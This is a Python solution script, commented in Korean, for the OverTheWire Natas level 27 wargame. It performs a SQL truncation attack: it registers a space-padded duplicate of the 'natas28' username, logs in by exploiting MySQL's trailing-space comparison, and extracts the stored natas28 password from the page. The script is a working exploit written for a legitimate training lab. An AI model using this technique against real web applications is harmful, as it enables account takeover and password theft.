import requests
import sys
import re

boundary = "=" * 65

if len(sys.argv) != 2:
  print(boundary)
  print("[-] 실행 포맷을 지키지 않았습니다. 아래와 같이 입력하여 실행하세요")
  print(f"   python {sys.argv[0]} natas27_password")
  print(boundary)
  sys.exit(0)


url = "http://natas27.natas.labs.overthewire.org/"
natas27_cred = sys.argv[1]

s = requests.Session()
s.auth = ("natas27", natas27_cred)

# [생성용] SQL truncation injection
# username = natas28(7) + 공백57 = 64자, 뒤에 'a'를 더해 65자로 만든다.
# 'a'를 붙이는 이유: createUser의 trim 검사(공백으로 끝나면 "Go away hacker")를 통과하기 위함.
# 서버가 substr($usr, 0, 64)로 64자까지만 자르므로, 65번째 'a'는 잘려나가고
# DB에는 'natas28' + 공백57 (64자)만 저장된다.
create_username = "natas28" + " " * 57 + "a"
create_data = {"username": create_username, "password": "1234"}

# [로그인용] 'a' 없이 natas28 + 공백만.
# validUser는 입력을 자르지 않고 그대로 조회하지만, MySQL의 VARCHAR 비교는
# 끝 공백을 무시(PADSPACE)하므로 'natas28'+공백 레코드가 매칭되어 로그인에 성공한다.
# ('a'를 그대로 두면 DB에 저장된 값과 달라져 매칭 실패 → 계속 신규 생성됨)
login_username = "natas28" + " " * 57
login_data = {"username": login_username, "password": "1234"}

# 계정이 없으면 생성(createUser), 있으면 로그인(checkCredentials) 분기.
# ① 먼저 생성 → ② 같은 비번으로 로그인하면, 로그인 성공 후 dumpData가
#    natas28 레코드를 통째로 print_r 하면서 원래 비밀번호가 노출된다.
s.post(url, data=create_data)
response = s.post(url, data=login_data)

# 입력 페이로드 출력
print(boundary)
print(f"생성한 username ===> {create_username}")
print(boundary)
print(f"로그인에 사용한 username ===> {login_username}")
print(boundary)

# print_r 출력에서 비밀번호 추출.
# '=>' 가 HTML 이스케이프되어 '=&gt;' 로 응답되므로 그에 맞춰 패턴을 작성한다.
password = re.search(r"\[password\] =&gt; \s*(\w+)", response.text)

# 비밀번호 출력 및 예외 처리
if password:
  print(f"natas28의 비밀번호 ===> {password.group(1)}")
  print(boundary)
else:
  print(f"전체 응답 html코드 확인")
  print(response.text)
  print(boundary)
